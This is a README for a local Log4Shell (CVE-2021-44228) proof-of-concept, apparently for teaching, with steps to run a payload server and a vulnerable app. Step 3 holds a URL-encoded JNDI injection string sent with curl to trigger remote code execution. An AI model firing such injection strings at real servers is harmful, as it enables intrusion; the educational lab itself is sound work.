# Log4j2 RCE Vulnerability POC

A bare minimum proof-of-concept for Log4j2 JNDI Remote-Code-Execution vulnerability (CVE-2021-44228). This is intended
for education purpose to help people who are not security researchers to understand how it works and how large the impact is.

## Prerequisites

- JDK 1.8

Note: JDK 1.8 is required for `payload-server` to compile, but the `victim-app` is vulnerable up to JDK 14 (they removed
the Nashorn engine JDK 15).

## To Test

1. Start the `payload-server` by running:

```console
$ ./gradlew runPayloadServer
```

2. Open a new terminal session then start the `victim-app`:

```console
$ ./gradlew runVictimApp
```

3. Run `curl http://localhost:8080/hello?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A8099%2Fexec%7D` to trigger the RCE.
4. To proof the remote code has been executed, check the console log of `victim-app`. You should see an unintended log
   has been printed on the screen.
